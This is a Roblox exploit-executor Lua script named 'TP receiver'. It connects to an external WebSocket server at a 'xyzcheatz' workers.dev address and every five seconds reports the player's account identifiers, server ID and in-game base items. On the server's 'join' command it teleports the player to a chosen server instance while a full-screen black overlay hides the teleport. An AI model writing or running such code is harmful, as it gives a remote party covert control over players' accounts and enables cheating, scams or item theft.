local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local WS_URL = "wss://tp-websocket.xyzcheatz.workers.dev/ws1"

local connect =
    (WebSocket and WebSocket.connect)
    or (websocket and websocket.connect)
    or (syn and syn.websocket and syn.websocket.connect)

assert(connect, "No WebSocket API found")

local activeBlackGui
local teleportAttempt = 0
local teleportBegan = false

local function trim(value)
    return tostring(value or ""):match("^%s*(.-)%s*$")
end

local function makeBlackGui()
    local gui = Instance.new("ScreenGui")
    gui.Name = "TPBlackScreen"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 2147483647
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local black = Instance.new("Frame")
    black.Name = "Black"
    black.Size = UDim2.fromScale(1, 1)
    black.BackgroundColor3 = Color3.new(0, 0, 0)
    black.BorderSizePixel = 0
    black.ZIndex = 100
    black.Parent = gui

    return gui
end

local function hideBlackTeleportScreen()
    if activeBlackGui then
        pcall(function()
            activeBlackGui:Destroy()
        end)
        activeBlackGui = nil
    end
end

local function showBlackTeleportScreen()
    if activeBlackGui and activeBlackGui.Parent then
        return
    end

    hideBlackTeleportScreen()

    local gui = makeBlackGui()
    local parent

    if gethui then
        local ok, result = pcall(gethui)
        if ok and result then
            parent = result
        end
    end

    parent = parent or LocalPlayer:WaitForChild("PlayerGui")
    gui.Parent = parent
    activeBlackGui = gui
end

local function prepareRobloxTeleportGui()
    local ok, err = pcall(function()
        TeleportService:SetTeleportGui(makeBlackGui())
    end)

    if not ok then
        warn("[TP RECEIVER] SetTeleportGui failed:", err)
    end
end

local function isYourBaseEnabled(plot)
    local plotSign = plot:FindFirstChild("PlotSign")
    if not plotSign then
        return false
    end

    local yourBase = plotSign:FindFirstChild("YourBase")
    if not yourBase then
        return false
    end

    local ok, enabled = pcall(function()
        return yourBase.Enabled
    end)

    return ok and enabled == true
end

local function findOwnPlot()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then
        return nil
    end

    for _, plot in ipairs(plots:GetChildren()) do
        if isYourBaseEnabled(plot) then
            return plot
        end
    end

    return nil
end

local function getGrabPrompt(promptAttachment)
    if not promptAttachment then
        return nil
    end

    if promptAttachment:IsA("ProximityPrompt")
        and trim(promptAttachment.ActionText) == "Grab" then
        return promptAttachment
    end

    for _, obj in ipairs(promptAttachment:GetDescendants()) do
        if obj:IsA("ProximityPrompt")
            and trim(obj.ActionText) == "Grab" then
            return obj
        end
    end

    return nil
end

local function collectOwnBaseItems()
    local plot = findOwnPlot()

    if not plot then
        return {}, nil, 0, 0
    end

    local podiums = plot:FindFirstChild("AnimalPodiums")
    if not podiums then
        return {}, plot.Name, 0, 0
    end

    local highestSlot = 0

    for _, child in ipairs(podiums:GetChildren()) do
        local slotNumber = tonumber(child.Name)
        if slotNumber and slotNumber > highestSlot then
            highestSlot = slotNumber
        end
    end

    local items = {}

    for slotNumber = 1, highestSlot do
        local slot = podiums:FindFirstChild(tostring(slotNumber))

        if slot then
            local base = slot:FindFirstChild("Base")
            local spawn = base and base:FindFirstChild("Spawn")
            local attachment = spawn and spawn:FindFirstChild("PromptAttachment")
            local prompt = getGrabPrompt(attachment)

            if prompt then
                local objectText = trim(prompt.ObjectText)

                if objectText ~= "" then
                    items[#items + 1] = {
                        name = "Slot " .. tostring(slotNumber) .. " -> " .. objectText
                    }
                end
            end
        end
    end

    table.sort(items, function(a, b)
        return (tonumber(a.slot) or 0) < (tonumber(b.slot) or 0)
    end)

    return items, plot.Name, highestSlot, #items
end

local ok, ws = pcall(function()
    return connect(WS_URL)
end)

if not ok then
    warn("[TP RECEIVER] Connection failed:", ws)
    return
end

if getgenv then
    getgenv().TPReceiverWS = ws
end

local function send(data)
    local success, err = pcall(function()
        ws:Send(HttpService:JSONEncode(data))
    end)

    if not success then
        warn("[TP RECEIVER] Send failed:", err)
    end
end

local function sendTPStatus(status, extra)
    local payload = {
        type = "tp_status",
        username = LocalPlayer.Name,
        status = status
    }

    if type(extra) == "table" then
        for key, value in pairs(extra) do
            payload[key] = value
        end
    end

    send(payload)
end

local function register(kind)
    local items, plotId, highestSlot, occupiedSlots = collectOwnBaseItems()

    send({
        type = kind or "register",
        username = LocalPlayer.Name,
        displayName = LocalPlayer.DisplayName,
        userId = LocalPlayer.UserId,
        placeId = game.PlaceId,
        jobId = game.JobId,
        plotId = plotId,
        highestSlot = highestSlot,
        occupiedSlots = occupiedSlots,
        items = items
    })
end

pcall(function()
    LocalPlayer.OnTeleport:Connect(function(state, placeId, spawnName)
        teleportBegan = true

        local stateName = tostring(state):gsub("^Enum%.TeleportState%.", "")

        if stateName == "Failed" then
            hideBlackTeleportScreen()
        else
            showBlackTeleportScreen()
        end

        sendTPStatus("teleport_state", {
            state = stateName,
            placeId = placeId,
            spawnName = spawnName
        })
    end)
end)

TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage, placeId)
    if player ~= LocalPlayer then
        return
    end

    teleportBegan = false
    hideBlackTeleportScreen()

    local resultName = tostring(teleportResult):gsub("^Enum%.TeleportResult%.", "")

    warn("[TP RECEIVER] TeleportInitFailed:", resultName, errorMessage)

    sendTPStatus("failed", {
        result = resultName,
        error = tostring(errorMessage or ""),
        placeId = placeId
    })
end)

local function handleMessage(message)
    local success, data = pcall(function()
        return HttpService:JSONDecode(message)
    end)

    if not success or type(data) ~= "table" then
        return
    end

    if data.type == "connected" then
        register("register")
        print("[TP RECEIVER] Ready/registering as", LocalPlayer.Name)
        return
    end

    if data.type == "registered" then
        print("[TP RECEIVER] Registered")
        return
    end

    if data.type ~= "join" then
        return
    end

    if data.target
        and tostring(data.target):lower() ~= LocalPlayer.Name:lower() then
        return
    end

    local placeId = tonumber(data.placeId)
    local jobId = trim(data.jobId)

    if not placeId or placeId <= 0 or jobId == "" then
        sendTPStatus("failed", {
            error = "Invalid PlaceId or JobId"
        })
        return
    end

    teleportAttempt += 1
    local thisAttempt = teleportAttempt
    teleportBegan = false

    sendTPStatus("received", {
        placeId = placeId,
        jobId = jobId
    })

    prepareRobloxTeleportGui()

    sendTPStatus("requesting", {
        placeId = placeId,
        jobId = jobId
    })

    local tpOk, tpErr = pcall(function()
        TeleportService:TeleportToPlaceInstance(
            placeId,
            jobId,
            LocalPlayer
        )
    end)

    if not tpOk then
        hideBlackTeleportScreen()

        sendTPStatus("failed", {
            error = tostring(tpErr),
            placeId = placeId,
            jobId = jobId
        })
        return
    end

    sendTPStatus("request_call_returned", {
        placeId = placeId,
        jobId = jobId
    })

    task.delay(3, function()
        if teleportAttempt == thisAttempt and not teleportBegan then
            hideBlackTeleportScreen()

            sendTPStatus("no_start", {
                error = "Roblox did not enter a teleport state after the request",
                placeId = placeId,
                jobId = jobId
            })
        end
    end)
end

if ws.OnMessage then
    ws.OnMessage:Connect(handleMessage)
elseif ws.Message then
    ws.Message:Connect(handleMessage)
else
    warn("[TP RECEIVER] No message event found")
end

if ws.OnClose then
    ws.OnClose:Connect(function()
        warn("[TP RECEIVER] WebSocket disconnected")
    end)
end

task.spawn(function()
    while true do
        task.wait(5)
        register("update")
    end
end)
